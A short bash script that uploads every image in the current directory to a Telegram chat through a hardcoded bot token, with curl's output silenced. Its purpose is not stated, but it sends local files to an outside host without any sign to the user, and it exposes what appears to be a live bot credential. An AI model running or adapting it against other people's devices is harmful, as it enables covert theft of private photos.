#!/bin/bash

# === CONFIGURATION ===
BOT_TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
CHAT_ID="6565158025"

# === FUNCTION TO SEND IMAGE ===
send_image() {
  local file="$1"
  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
    -F chat_id="$CHAT_ID" \
    -F photo=@"$file" > /dev/null
}

# === MAIN LOOP ===
for img in ./*.{jpg,jpeg,png,gif,JPG,JPEG,PNG,GIF}; do
  [ -f "$img" ] && send_image "$img"
done
